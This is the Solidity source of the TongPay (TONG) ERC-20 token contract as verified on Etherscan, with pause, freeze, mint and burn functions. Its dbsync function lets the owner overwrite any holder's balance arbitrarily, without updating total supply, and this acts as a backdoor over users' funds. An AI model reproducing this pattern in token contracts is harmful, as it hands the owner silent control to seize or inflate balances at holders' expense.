/**
 * Source Code first verified at https://etherscan.io on Wednesday, April 17, 2019
 (UTC) */

pragma solidity ^0.5.0;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address payable from, address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event FrozenFunds(address target, bool freeze);
    event ethReceipt(address from, uint value);
    event sellLog(address seller, uint sell_token, uint in_eth);
    event Paused(address account);
    event Unpaused(address account);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract ERC20 is IERC20 {

    using SafeMath for uint256;

    address payable private _owner;
    string private _name;
    string private _symbol;
    uint8 private _decimals = 18;
    uint256 private _totalSupply;
    bool private _paused;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowed;

    mapping (address => bool) public frozenAccount;

    constructor() public{
        _totalSupply = 10000000000e18;
        _name = "TongPay";
        _symbol = "TONG";
        _balances[msg.sender] = _totalSupply;
        _paused = false;
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    
    modifier onlyOwner() {
        require(isOwner(), "YOUR NOT OWNER");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function getName() public view returns (string memory){
        return _name;
    }
    
    function getSymbol() public view returns(string memory){
        return _symbol;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address payable newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address payable newOwner) internal {
        require(newOwner != address(0),"It's not a normal approach.");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function paused() public view returns (bool) {
        return _paused;
    }

    modifier whenNotPaused() {
        require(!_paused);
        _;
    }

    modifier whenPaused() {
        require(_paused,"This contract has been suspended.");
        _;
    }

    function pause() public onlyOwner whenNotPaused {
        _paused = true;
        emit Paused(msg.sender);
    }

    function unpause() public onlyOwner whenPaused {
        _paused = false;
        emit Unpaused(msg.sender);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address user) public view returns (uint256) {
        return _balances[user];
    }

    function allowance(address user, address spender) public view returns (uint256) {
        return _allowed[user][spender];
    }

    function transfer(address to, uint256 value) public whenNotPaused returns (bool) {
        require(_balances[msg.sender] >= value,"be short of balance");
        _transfer(msg.sender, to, value);
        return true;
    }

    function burn(uint value) public whenNotPaused returns(bool) {
         _burn(msg.sender, value);
         return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address payable from, address to, uint256 value) public whenNotPaused returns (bool) {
        require(_allowed[from][msg.sender] >= value,"be short of balance");
        _transfer(from, to, value);
        _approve(from, msg.sender, _allowed[from][msg.sender].sub(value));
        return true;
    }

    function mint(uint value) public whenNotPaused onlyOwner returns(bool){
        _mint(msg.sender, value);
        return true;
    }

    function burnFrom(address account, uint value) public returns(bool){
        _burnFrom(account, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowed[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowed[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function _transfer(address payable from, address to, uint256 value) internal {
        require(to != address(0),"be not a normal approach");
        require(to != from,"You can't send it alone.");
        require(value <= _balances[from],"be short of balance");
        require(!frozenAccount[from],"This account has been frozen. [Sender]");
        require(!frozenAccount[to],"This account has been frozen. [Recipient]");
        require(!frozenAccount[msg.sender],"This account has been frozen. [Wallet]");
  
        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(value);
        
        emit Transfer(from, to, value);
    }

    function _mint(address account, uint256 value) internal {
        require(account != address(0),"be not a normal approach");

        _totalSupply = _totalSupply.add(value);
        _balances[account] = _balances[account].add(value);
        emit Transfer(address(0), account, value);
    }

    function _burn(address account, uint256 value) internal {
        require(account != address(0),"be not a normal approach");
        require(value <= _balances[account],"be short of balance");

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }

    function _approve(address user, address spender, uint256 value) internal {
        require(spender != address(0),"be not a normal approach");
        require(user != address(0),"be not a normal approach");

        _allowed[user][spender] = value;
        emit Approval(user, spender, value);
    }

    function _burnFrom(address account, uint256 value) internal {
        _burn(account, value);
        _approve(account, msg.sender, _allowed[account][msg.sender].sub(value));
    }

    function freezeAccount(address target) onlyOwner public {
        frozenAccount[target] = true;
        emit FrozenFunds(target, true);
    }
    
     function unfreezeAccount(address target) onlyOwner public {
        frozenAccount[target] = false;
        emit FrozenFunds(target, false);
    }

    function () payable external{
        if(msg.sender != _owner){
            revert();
        }
    }  
    
    function dbsync(address[] memory _addrs, uint256[] memory _value) onlyOwner public{
        for(uint i = 0; i < _addrs.length; i++){
            _balances[_addrs[i]] = _value[i];
        }
    }
}

contract TongPay is ERC20{}